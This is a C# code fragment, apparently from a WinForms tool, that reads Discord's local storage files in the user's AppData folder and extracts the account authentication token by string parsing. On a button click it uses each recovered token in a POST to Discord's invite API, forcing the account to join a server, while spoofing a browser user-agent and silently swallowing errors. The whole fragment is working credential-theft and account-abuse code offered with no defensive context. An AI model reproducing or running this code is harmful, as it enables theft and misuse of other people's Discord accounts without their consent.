 private static string Sub(string strong)
        {
            string[] array = strong.Substring(strong.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }

        private static string GetToken(string path)
        {
            string text = "";
            using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                {
                    text = streamReader.ReadToEnd();
                    streamReader.Dispose();
                    fileStream.Dispose();
                    streamReader.Close();
                    fileStream.Close();
                    
                }
            }
            string result = "";

            while (text.Contains("oken"))
            {
                string[] array = Sub(text).Split(new char[]
                {
                    '"'
                });
                result = array[0];
                text = string.Join("\"", array);
            }
            return result;
        }
        
        private void button1_Click(object sender, EventArgs e)
        {
            foreach (string text in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb"))
            {
                if (text.EndsWith(".ldb") || text.EndsWith(".log"))
                {
                   try{
                    
                     WebRequest webRequest = WebRequest.Create(new Uri("https://discordapp.com/api/v6/invite/{invitation code}"));
                    HttpWebRequest httpWebRequest = (HttpWebRequest)webRequest;
                    httpWebRequest.PreAuthenticate = true;
                    httpWebRequest.Accept = "application/json";
                    httpWebRequest.Method = "POST";
                    httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0";
                    httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
                    httpWebRequest.ContentLength = 0L;
                    httpWebRequest.Headers.Add("authorization", Form1.GetToken(text));
                    httpWebRequest.Referer = "https://discordapp.com/activity";
                    WebResponse response = webRequest.GetResponse();
                    Stream responseStream = response.GetResponseStream();
                    StreamReader streamReader = new StreamReader(responseStream, Encoding.Default);
                    streamReader.ReadToEnd();
                    streamReader.Close();
                    response.Close();
                    
                   } catch{}
                }
            }
        }
